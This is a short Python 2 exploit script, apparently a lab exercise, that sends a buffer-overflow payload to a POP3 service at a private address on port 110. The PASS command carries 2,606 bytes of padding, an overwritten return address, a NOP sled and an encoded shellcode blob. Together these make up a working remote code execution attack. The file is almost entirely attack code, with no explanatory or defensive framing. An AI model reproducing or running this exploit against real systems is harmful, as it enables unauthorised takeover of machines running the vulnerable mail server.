#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Variable containing shellcode
shellcode =("\xb8\x52\x2f\x27\xbf\xdb\xcf\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x56\x31\x43\x13\x83\xeb\xfc\x03\x43\x5d\xcd\xd2\x43\x89\x93"
"\x1d\xbc\x49\xf4\x94\x59\x78\x34\xc2\x2a\x2a\x84\x80\x7f\xc6"
"\x6f\xc4\x6b\x5d\x1d\xc1\x9c\xd6\xa8\x37\x92\xe7\x81\x04\xb5"
"\x6b\xd8\x58\x15\x52\x13\xad\x54\x93\x4e\x5c\x04\x4c\x04\xf3"
"\xb9\xf9\x50\xc8\x32\xb1\x75\x48\xa6\x01\x77\x79\x79\x1a\x2e"
"\x59\x7b\xcf\x5a\xd0\x63\x0c\x66\xaa\x18\xe6\x1c\x2d\xc9\x37"
"\xdc\x82\x34\xf8\x2f\xda\x71\x3e\xd0\xa9\x8b\x3d\x6d\xaa\x4f"
"\x3c\xa9\x3f\x54\xe6\x3a\xe7\xb0\x17\xee\x7e\x32\x1b\x5b\xf4"
"\x1c\x3f\x5a\xd9\x16\x3b\xd7\xdc\xf8\xca\xa3\xfa\xdc\x97\x70"
"\x62\x44\x7d\xd6\x9b\x96\xde\x87\x39\xdc\xf2\xdc\x33\xbf\x9a"
"\x11\x7e\x40\x5a\x3e\x09\x33\x68\xe1\xa1\xdb\xc0\x6a\x6c\x1b"
"\x51\x7c\x8f\xf3\xd9\xed\x71\xf4\x19\x27\xb6\xa0\x49\x5f\x1f"
"\xc9\x02\x9f\xa0\x1c\xbe\x95\x36\x95\x3e\xa8\xc0\xc1\x3c\xac"
"\xcd\xaa\xc9\x4a\x9d\x9c\x99\xc2\x5e\x4d\x59\xb3\x36\x87\x56"
"\xec\x27\xa8\xbd\x85\xc2\x47\x6b\xfd\x7a\xf1\x36\x75\x1a\xfe"
"\xed\xf3\x1c\x74\x07\x03\xd2\x7d\x62\x17\x03\x1a\x8c\xe7\xd4"
"\x8f\x8c\x8d\xd0\x19\xdb\x39\xdb\x7c\x2b\xe6\x24\xab\x28\xe1"
"\xdb\x2a\x18\x99\xea\xb8\x24\xf5\x12\x2d\xa4\x05\x45\x27\xa4"
"\x6d\x31\x13\xf7\x88\x3e\x8e\x64\x01\xab\x31\xdc\xf5\x7c\x5a"
"\xe2\x20\x4a\xc5\x1d\x07\xc8\x02\xe1\xd5\xe7\xaa\x89\x25\xb8"
"\x4a\x49\x4c\x38\x1b\x21\x9b\x17\x94\x81\x64\xb2\xfd\x89\xef"
"\x53\x4f\x28\xef\x79\x11\xf4\xf0\x8e\x8a\x07\x8a\xff\x2d\xe8"
"\x6b\x16\x4a\xe9\x6b\x16\x6c\xd6\xbd\x2f\x1a\x19\x7e\x14\x15"
"\x2c\x23\x3d\xbc\x4e\x77\x3d\x95")

buff = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode

try:
    print "\nSending buffer..."
    #Connect to Windows machine
    s.connect(('10.0.2.15', 110))
    data = s.recv(1024)
    s.send('USER username' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buff + '\r\n')
    print "\nDone!"
	
except:
    print "Could not connect" 
